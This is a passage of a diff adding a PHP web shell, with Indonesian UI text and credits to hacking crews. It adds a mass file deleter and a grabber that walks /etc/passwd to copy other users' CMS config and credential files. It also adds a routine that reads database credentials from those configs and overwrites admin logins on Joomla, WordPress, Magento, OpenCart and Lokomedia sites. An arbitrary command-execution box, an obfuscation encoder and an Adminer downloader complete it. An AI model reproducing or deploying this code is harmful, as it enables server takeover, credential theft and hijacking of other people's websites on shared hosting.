+                       echo "[<font color=#52CF38>Terhapus</font>] $lokasi<br>";
+                       unlink($lokasi);
+                       $idx = hapus_massal($dirc,$namafile);
+                   }
+               }
+           }
+       }
+   }
+}
+   }
+   if($_POST['start']) {
+echo "<div style='margin: 5px auto; padding: 5px'>";
+hapus_massal($_POST['d_dir'], $_POST['d_file']);
+echo "</div>";
+   } else {
+   echo "<center>";
+   echo "<form method='post'>
+   <font>Folder :</font><br>
+   <input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
+   <font>Filename :</font><br>
+   <input type='text' name='d_file' value='nyawa lu aja mass delete gan:v' style='width: 450px;' height='10'><br>
+   <input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
+   </form></center>";
+   }
+   //CONFIG///////////
+   } elseif($_GET['to'] == 'config') {
+   $etc = fopen("/etc/passwd", "r") or die("<pre><font color=#666>Can't read /etc/passwd</font></pre>");
+   $idx = mkdir("zet_CONFIG", 0777);
+   $isi_htc = "Options all\nRequire None\nSatisfy Any";
+   $htc = fopen("zet_CONFIG/.htaccess","w");
+   fwrite($htc, $isi_htc);
+   while($passwd = fgets($etc)) {
+   if($passwd == "" || !$etc) {
+   echo "<font color=#666>Can't read /etc/passwd</font>";
+   } else {
+   preg_match_all('/(.*?):x:/', $passwd, $user_config);
+   foreach($user_config[1] as $user_3X0RC1ST) {
+   $user_config_dir = "/home/$user_zet/public_html/";
+   if(is_readable($user_config_dir)) {
+   $grab_config = array(
+   "/home/$user_zet/.my.cnf" => "cpanel",
+   "/home/$user_zet/.accesshash" => "WHM-accesshash",
+   "/home/$user_zet/public_html/vdo_config.php" => "Voodoo",
+   "/home/$user_zet/public_html/bw-configs/config.ini" => "BosWeb",
+   "/home/$user_zet/public_html/config/koneksi.php" => "Lokomedia",
+   "/home/$user_zet/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
+   "/home/$user_zet/public_html/clientarea/configuration.php" => "WHMCS",
+   "/home/$user_zet/public_html/whm/configuration.php" => "WHMCS",
+   "/home/$user_zet/public_html/whmcs/configuration.php" => "WHMCS",
+   "/home/$user_zet/public_html/forum/config.php" => "phpBB",
+   "/home/$user_zet/public_html/sites/default/settings.php" => "Drupal",
+   "/home/$user_zet/public_html/config/settings.inc.php" => "PrestaShop",
+   "/home/$user_zet/public_html/app/etc/local.xml" => "Magento",
+   "/home/$user_zet/public_html/joomla/configuration.php" => "Joomla",
+   "/home/$user_zet/public_html/configuration.php" => "Joomla",
+   "/home/$user_zet/public_html/wp/wp-config.php" => "WordPress",
+   "/home/$user_zet/public_html/wordpress/wp-config.php" => "WordPress",
+   "/home/$user_zet/public_html/wp-config.php" => "WordPress",
+   "/home/$user_zet/public_html/admin/config.php" => "OpenCart",
+   "/home/$user_zet/public_html/slconfig.php" => "Sitelok",
+   "/home/$user_zet/public_html/application/config/database.php" => "Ellislab");
+   foreach($grab_config as $config => $nama_config) {
+   $ambil_config = file_get_contents($config);
+   if($ambil_config == '') {
+   } else {	
+   $file_config = fopen("3X0RC1ST_CONFIG/$user_jefri-$nama_config.txt","w");
+   fputs($file_config,$ambil_config);
+   }
+   }
+   }      
+   }
+   }  
+   }
+   echo "<center><a href='?path=$path/3X0RC1ST_CONFIG'><font color=#52CF38>Selesai!</font></a></center>";
+ 
+ } elseif($_GET['do'] == 'auto_edit_user') {
+ if($_POST['hajar']) {
+ if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
+ echo "username atau password harus lebih dari 6 karakter";
+ } else {
+ $user_baru = $_POST['user_baru'];
+ $pass_baru = md5($_POST['pass_baru']);
+ $conf = $_POST['config_dir'];
+ $scan_conf = scandir($conf);
+ foreach($scan_conf as $file_conf) {
+ if(!is_file("$conf/$file_conf")) continue;
+ $config = file_get_contents("$conf/$file_conf");
+ if(preg_match("/JConfig|joomla/",$config)) {
+ $dbhost = ambilkata($config,"host = '","'");
+ $dbuser = ambilkata($config,"user = '","'");
+ $dbpass = ambilkata($config,"password = '","'");
+ $dbname = ambilkata($config,"db = '","'");
+ $dbprefix = ambilkata($config,"dbprefix = '","'");
+ $prefix = $dbprefix."users";
+ $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+ $db = mysql_select_db($dbname);
+ $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
+ $result = mysql_fetch_array($q);
+ $id = $result['id'];
+ $site = ambilkata($config,"sitename = '","'");
+ $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
+ echo "Config => ".$file_conf."<br>";
+ echo "CMS => Joomla<br>";
+ if($site == '') {
+ echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
+ } else {
+ echo "Sitename => $site<br>";
+ }
+ if(!$update OR !$conn OR !$db) {
+ echo "Status => <font color=red>".mysql_error()."</font><br><br>";
+ } else {
+ echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
+ }
+ mysql_close($conn);
+ } elseif(preg_match("/WordPress/",$config)) {
+ $dbhost = ambilkata($config,"DB_HOST', '","'");
+ $dbuser = ambilkata($config,"DB_USER', '","'");
+ $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
+ $dbname = ambilkata($config,"DB_NAME', '","'");
+ $dbprefix = ambilkata($config,"table_prefix  = '","'");
+ $prefix = $dbprefix."users";
+ $option = $dbprefix."options";
+ $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+ $db = mysql_select_db($dbname);
+ $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
+ $result = mysql_fetch_array($q);
+ $id = $result[ID];
+ $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
+ $result2 = mysql_fetch_array($q2);
+ $target = $result2[option_value];
+ if($target == '') {
+ $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
+ } else {
+ $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
+ }
+ $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
+ echo "Config => ".$file_conf."<br>";
+ echo "CMS => Wordpress<br>";
+ echo $url_target;
+ if(!$update OR !$conn OR !$db) {
+ echo "Status => <font color=red>".mysql_error()."</font><br><br>";
+ } else {
+ echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
+ }
+ mysql_close($conn);
+ } elseif(preg_match("/Magento|Mage_Core/",$config)) {
+ $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
+ $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
+ $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
+ $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
+ $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
+ $prefix = $dbprefix."admin_user";
+ $option = $dbprefix."core_config_data";
+ $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+ $db = mysql_select_db($dbname);
+ $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
+ $result = mysql_fetch_array($q);
+ $id = $result[user_id];
+ $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
+ $result2 = mysql_fetch_array($q2);
+ $target = $result2[value];
+ if($target == '') {
+ $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
+ } else {
+ $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
+ }
+ $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
+ echo "Config => ".$file_conf."<br>";
+ echo "CMS => Magento<br>";
+ echo $url_target;
+ if(!$update OR !$conn OR !$db) {
+ echo "Status => <font color=red>".mysql_error()."</font><br><br>";
+ } else {
+ echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
+ }
+ mysql_close($conn);
+ } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
+ $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
+ $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
+ $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
+ $dbname = ambilkata($config,"'DB_DATABASE', '","'");
+ $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
+ $prefix = $dbprefix."user";
+ $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+ $db = mysql_select_db($dbname);
+ $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
+ $result = mysql_fetch_array($q);
+ $id = $result[user_id];
+ $target = ambilkata($config,"HTTP_SERVER', '","'");
+ if($target == '') {
+ $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
+ } else {
+ $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
+ }
+ $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
+ echo "Config => ".$file_conf."<br>";
+ echo "CMS => OpenCart<br>";
+ echo $url_target;
+ if(!$update OR !$conn OR !$db) {
+ echo "Status => <font color=red>".mysql_error()."</font><br><br>";
+ } else {
+ echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
+ }
+ mysql_close($conn);
+ } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
+ $dbhost = ambilkata($config,'server = "','"');
+ $dbuser = ambilkata($config,'username = "','"');
+ $dbpass = ambilkata($config,'password = "','"');
+ $dbname = ambilkata($config,'database = "','"');
+ $prefix = "users";
+ $option = "identitas";
+ $conn = mysql_connect($dbhost,$dbuser,$dbpass);
+ $db = mysql_select_db($dbname);
+ $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
+ $result = mysql_fetch_array($q);
+ $target = $result[alamat_website];
+ if($target == '') {
+ $target2 = $result[url];
+ $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
+ if($target2 == '') {
+ $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
+ } else {
+ $cek_login3 = file_get_contents("$target2/adminweb/");
+ $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
+ if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
+ $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
+ } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
+ $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
+ } else {
+ $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
+ }
+ }
+ } else {
+ $cek_login = file_get_contents("$target/adminweb/");
+ $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
+ if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
+ $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
+ } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
+ $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
+ } else {
+ $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
+ }
+ }
+ $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
+ echo "Config => ".$file_conf."<br>";
+ echo "CMS => Lokomedia<br>";
+ if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
+ echo $url_target2;
+ } else {
+ echo $url_target;
+ }
+ if(!$update OR !$conn OR !$db) {
+ echo "Status => <font color=red>".mysql_error()."</font><br><br>";
+ } else {
+ echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
+ }
+ mysql_close($conn);
+ }
+ }
+ }
+ } else {
+ echo "<center>
+ <h1>Auto Edit User Config</h1>
+ <form method='post'>
+ DIR Config: <br>
+ <input type='text' size='50' name='config_dir' value='$dir'><br><br>
+ Set User & Pass: <br>
+ <input type='text' name='user_baru' value='zet brohhh' placeholder='user_baru'><br>
+ <input type='text' name='pass_baru' value='zet brohhh' placeholder='pass_baru'><br>
+ <input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
+ </form>
+ <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
+ ";
+ }
+ 
+ } elseif($_GET['do'] == 'endec') {
+ @ini_set('output_buffering',0); 
+ @ini_set('display_errors', 0);
+ $text = $_POST['code'];
+ ?>
+ <center>
+ <h2>Encode And Decode</h2>
+ <form method="post">
+ <br>
+ <textarea class='form-control con7' cols='60' rows='10' name="code"></textarea>
+ <br><br>
+ <select class='form-control con7' size="1" name="ope">
+ <center>
+ <option value="urlencode">url</option>
+ <option value="base64">base64</option>
+ <option value="ur">convert_uu</option>
+ <option value="json">json</option>
+ <option value="gzinflates">gzinflate - base64</option>
+ <option value="str2">str_rot13 - base64</option>
+ <option value="gzinflate">str_rot13 - gzinflate - base64</option>
+ <option value="gzinflater">gzinflate - str_rot13 - base64</option>
+ <option value="gzinflatex">gzinflate - str_rot13 - gzinflate - base64</option>
+ <option value="gzinflatew">str_rot13-convert_uu-url-gzinflate-str_rot13-base64-convert_uu-gzinflate-url-str_rot13-gzinflate-base64</option>
+ <option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
+ <option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
+ </center>
+ </select>
+ &nbsp;<br><br><input class='kntd' type='submit' name='submit' value='Encode'>
+ <input class='kntd' type='submit' name='submits' value='Decode'>
+ </form>
+ <br>
+ <?php 
+ $submit = $_POST['submit'];
+ if (isset($submit)){
+ $op = $_POST["ope"];
+ switch ($op) {case 'base64': $codi=base64_encode($text);
+ break;case 'str' : $codi=(base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
+ break;case 'json' : $codi=json_encode(utf8_encode($text));
+ break;case 'gzinflate' : $codi=base64_encode(gzdeflate(str_rot13($text)));
+ break;case 'gzinflater' : $codi=base64_encode(str_rot13(gzdeflate($text)));
+ break;case 'gzinflatex' : $codi=base64_encode(gzdeflate(str_rot13(gzdeflate($text))));
+ break;case 'gzinflatew' : $codi=base64_encode(gzdeflate(str_rot13(rawurlencode(gzdeflate(convert_uuencode(base64_encode(str_rot13(gzdeflate(convert_uuencode(rawurldecode(str_rot13($text))))))))))));
+ break;case 'gzinflates' : $codi=base64_encode(gzdeflate($text));
+ break;case 'str2' : $codi=base64_encode(str_rot13($text));
+ break;case 'urlencode' : $codi=rawurlencode($text);
+ break;case 'ur' : $codi=convert_uuencode($text);
+ break;case 'url' : $codi=base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
+ break;default:break;}}
+ 
+ $submit = $_POST['submits'];
+ if (isset($submit)){
+ $op = $_POST["ope"];
+ switch ($op) {case 'base64': $codi=base64_decode($text);
+ break;case 'str' : $codi=str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
+ break;case 'json' : $codi=utf8_decode(json_decode($text));
+ break;case 'gzinflate' : $codi=str_rot13(gzinflate(base64_decode($text)));
+ break;case 'gzinflater' : $codi=gzinflate(str_rot13(base64_decode($text)));
+ break;case 'gzinflatex' : $codi=gzinflate(str_rot13(gzinflate(base64_decode($text))));
+ break;case 'gzinflatew' : $codi=str_rot13(rawurldecode(convert_uudecode(gzinflate(str_rot13(base64_decode(convert_uudecode(gzinflate(rawurldecode(str_rot13(gzinflate(base64_decode($text))))))))))));
+ break;case 'gzinflates' : $codi=gzinflate(base64_decode($text));
+ break;case 'str2' : $codi=str_rot13(base64_decode($text));
+ break;case 'urlencode' : $codi=rawurldecode($text);
+ break;case 'ur' : $codi=convert_uudecode($text);
+ break;case 'url' : $codi=base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($text)))))));
+ break;default:break;}}
+ $html = htmlentities(stripslashes($codi));
+ echo "<form><textarea cols=60 rows=10 class='form-control con7' >".$html."</textarea></center></form><br/><br/>";
+ } elseif($_GET['do'] == 'hashgen') {
+ $submit = $_POST['enter'];
+ if (isset($submit)) {
+ $pass = $_POST['password']; // password
+ $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
+ $hash = md5($pass); // md5 hash #1
+ $md4 = hash("md4", $pass);
+ $hash_md5 = md5($salt . $pass); // md5 hash with salt #2
+ $hash_md5_double = md5(sha1($salt . $pass)); // md5 hash with salt & sha1 #3
+ $hash1 = sha1($pass); // sha1 hash #4
+ $sha256 = hash("sha256", $text);
+ $hash1_sha1 = sha1($salt . $pass); // sha1 hash with salt #5
+ $hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6
+ }
+ echo '<form action="" method="post">';
+ echo '<center><h2>Hash Generator</h2>';
+ echo '<table>';
+ echo 'Masukkan teks yang ingin di encrypt: ';
+ echo '<input class="inputz" type="text" name="password" size="40">';
+ echo '<input class="inputzbut" type="submit" name="enter" value="Hash!">';
+ echo '<br>';
+ echo 'Original Password: <input class=inputz type=text size=50 value='.$pass.'><br><br>';
+ echo 'MD5: <input class=inputz type=text size=50 value='.$hash.'><br><br>';
+ echo 'MD4: <input class=inputz type=text size=50 value='.$md4 .'><br><br>';
+ echo 'MD5 with Salt: <input class=inputz type=text size=50 value='.$hash_md5.'><br><br>';
+ echo 'MD5 with Salt & Sha1: <input class=inputz type=text size=50 value='.$hash_md5_double.'><br><br>';
+ echo 'Sha1: <input class=inputz type=text size=50 value='.$hash1 .'><br><br>';
+ echo 'Sha256: <input class=inputz type=text size=50 value='.$sha256.'><br><br>';
+ echo 'Sha1 with Salt: <input class=inputz type=text size=50 value='.$hash1_sha1.'><br><br>';
+ echo 'Sha1 with Salt & MD5: <input class=inputz type=text size=50 value='.$hash1_sha1_double.'></center></table>';
+ } elseif($_GET['do'] == 'about') {
+   ?>
+   <tr>
+   <td>
+   <center>
+   <h2 style='color'#00ddff'>About Me</font></h2>
+   <p style='color: white;'>Team: JawaBaratCyber - <font color="red">Cowok Tersakiti Team</font> - Indonrsian error system - JavaCyberArmy - Dan lain lain</p>
+   </center>
+   </td>
+   </tr>
+   <?php
+   } elseif($_GET['do'] == 'adminer') {
+ $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
+ function adminer($url, $isi) {
+ $fp = fopen($isi, "w");
+ $ch = curl_init();
+ curl_setopt($ch, CURLOPT_URL, $url);
+ curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
+ curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+ curl_setopt($ch, CURLOPT_FILE, $fp);
+ return curl_exec($ch);
+ curl_close($ch);
+ fclose($fp);
+ ob_flush();
+ flush();
+ }
+ if(file_exists('adminer.php')) {
+ echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
+ } else {
+ if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
+ echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
+ } else {
+ echo "<center><font color=red>gagal buat file adminer</font></center>";
+ }  
+
+ }
+
+}  elseif($_GET['to'] == 'cmd') {
+	echo "<form method='post'>
+	<font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
+	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
+	</form>";
+	if($_POST['do_cmd']) {
+		echo "<pre>".exe($_POST['cmd'])."</pre>";
+	}
+}
+
+if(isset($_GET['filesrc'])){
+echo "<tr><td>Current File : ";
+echo $_GET['filesrc'];
+echo '</tr></td></table><br />';
+echo "[ <a href='?path=$path'>Kembali</a> ]"; 
+echo('<textarea class="potext" cols=80 rows=20> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
+}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
+echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
+if($_POST['opt'] == 'chmod'){
+if(isset($_POST['perm'])){
+if(chmod($_POST['path'],$_POST['perm'])){
+echo '<font color="lime">CANGE PERM SUCCES !!!!!</font><br/>';
+echo "[ <a href='?path=$path'>Kembali</a> ]";
+}else{
+echo '<script> alert("CANGE PERM GAGAL NJING !!!!!")</font><br />';
+}
+}
+echo '<form method="POST">
+Permission : <br><input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver; text-align: left"/>
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="chmod"><br>
+<input type="submit" value="submit" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:gold;border:2px solid silver"/>
+</form>';
+}elseif($_POST['opt'] == 'rename'){
+if(isset($_POST['newname'])){
+if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
+echo '<font color="lime">RENAME SUCCES !!!!!</font><br/>';
+echo "[ <a href='?path=$path'>Kembali</a> ]";
+}else{
+echo '<script> alert("RENAME GAGAL !!!!!")</script><br />';
+}
+$_POST['name'] = $_POST['newname'];
+}
+echo '<form method="POST">
+New Name <br><input name="newname" type="text" size="20" value="'.$_POST['name'].'" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:black;color:silver;border:2px solid silver; text-align: left"/>
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="rename"><br>
+<input type="submit" value="submit" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:gold;border:2px solid silver"/>
+</form>';
+}elseif($_POST['opt'] == 'edit'){
+if(isset($_POST['src'])){
+$fp = fopen($_POST['path'],'w');
+if(fwrite($fp,$_POST['src'])){
+echo '<font color="lime">EDIT SUCCES<br/>';
+echo "[ <a href='?path=$path'>Kembali</a> ]";
+}else{
+echo '<script> alert("EDIT GAGAL CONG !!!!!")</script></font><br/>';
+}
+fclose($fp);
+}
+echo '<form method="POST">
+<textarea class="potext" cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="edit">
+<input type="submit" value="Save" style="margin-top:4px;width:500px;font-family:Kelly Slab;font-size:15;background:transparent;color:gold;border:2px solid silver;border-radius:5px"/>
+</form>';
+}
+echo '</center>';
+}else{
+echo '</table><br/><center>';
+if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
+if($_POST['type'] == 'dir'){
+if(rmdir($_POST['path'])){
+echo '<script> alert("SUCCES !!!!!")</script><br/>';
+}else{
+echo '<font color="red">Directory Gagal Terhapus om                                                                                                                                                                                                                                                                                           </font><br/>';
+}
+}elseif($_POST['type'] == 'file'){
+if(unlink($_POST['path'])){
+echo '<script> alert("SUCCES !!!!!")</script><br/>';
+}else{
+echo '<font color="red">File Gagal Dihapus om</font><br/>';
+}
+}
+}
+echo '</center>';
+$scandir = scandir($path);
+echo '<div id="content"><table width="100%" class="td_table">
+<tr class="first">
+<td class="pl"><center><font>Name</peller></center></td>
+<td class="pl"><center><font>Size</peller></center></td>
+<td class="pl"><center><font>Permission</peller></center></td>
+<td class="pl"><center><font>Action</peller></center></td>
+</tr>';
+foreach($scandir as $dir){
+if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
+echo '<tr class="s_tb">
+<td class="pt"><img src="data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs="> <a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
+<td class="pl"><center>--</center></td>
+<td class="pl"><center>';
+if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
+elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
+echo perms($path.'/'.$dir);
+if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
+
+echo '</center></td>
+<td class="pl"><center><form method="POST" action="?option&path='.$path.'">
+<select name="opt" style="margin-top:6px;width:120px;font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px solid #00ddff;border-radius:5px">
+<option value="">Select</option>
+<option value="delete">Delete</option>
+<option value="chmod">Chmod</option>
+<option value="rename">RenaMe</option>
+</select>
+<input type="hidden" name="type" value="dir">
+<input type="hidden" name="name" value="'.$dir.'">
+<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
+<input type="submit" value=">" style="margin-top:6px;width:20px;font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px solid #00ddff;border-radius:5px">
+</form></center></td>
+</tr>';
+}
+echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
+foreach($scandir as $file){
+if(!is_file($path.'/'.$file)) continue;
+$size = filesize($path.'/'.$file)/1024;
+$size = round($size,3);
+if($size >= 1024){
+$size = round($size/1024,2).' MB';
+}else{
+$size = $size.' KB';
+}
+
+echo '<tr class="pl">
+<td class="pt"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII="> <a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
+<td class="pl"><center>'.$size.'</center></td>
+<td class="pl"><center>';
+if(is_writable($path.'/'.$file)) echo '<font color="lime">';
+elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
+echo perms($path.'/'.$file);
+if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
+echo '</center></td>
+<td class="pl"><center><form method="POST" action="?option&path='.$path.'">
+<select name="opt" style="margin-top:6px;width:120px;font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px solid #00ddff;border-radius:5px">
+<option value="">Select</option>
+<option value="delete">Delete</option>
+<option value="chmod">Chmod</option>
+<option value="rename">Rename</option>
+<option value="edit">Edit</option>
+</select>
+<input type="hidden" name="type" value="file">
+<input type="hidden" name="name" value="'.$file.'">
+<input type="hidden" name="path" value="'.$path.'/'.$file.'">
+<input type="submit" value=">" style="margin-top:6px;width:20px;font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px solid #00ddff;border-radius:5px">
+</form></center></td>
+</tr>';
+}
+echo '</table>
+</div>';
+}
+echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 20px gold, 0 0 5px gold, 0 0 7px red, 0 0 45px gold; font-weight:bold: white; font-size:15px">" Ojol Cyber Army</center>
+</body>
+</html>';
+function perms($file){
+$perms = fileperms($file);
+
+if (($perms & 0xC000) == 0xC000) {
+// Socket
+$info = 's';
+} elseif (($perms & 0xA000) == 0xA000) {
+// Symbolic Link
+$info = 'l';
+} elseif (($perms & 0x8000) == 0x8000) {
+// Regular
+$info = '-';
+} elseif (($perms & 0x6000) == 0x6000) {
+// Block special
+$info = 'b';
+} elseif (($perms & 0x4000) == 0x4000) {
+// Directory
+$info = 'd';
+} elseif (($perms & 0x2000) == 0x2000) {
+// Character special
+$info = 'c';
+} elseif (($perms & 0x1000) == 0x1000) {
+// FIFO pipe
+$info = 'p';
+} else {
+// Unknown
+$info = 'u';
+}
+
+// Owner
+$info .= (($perms & 0x0100) ? 'r' : '-');
+$info .= (($perms & 0x0080) ? 'w' : '-');
+$info .= (($perms & 0x0040) ?
+(($perms & 0x0800) ? 's' : 'x' ) :
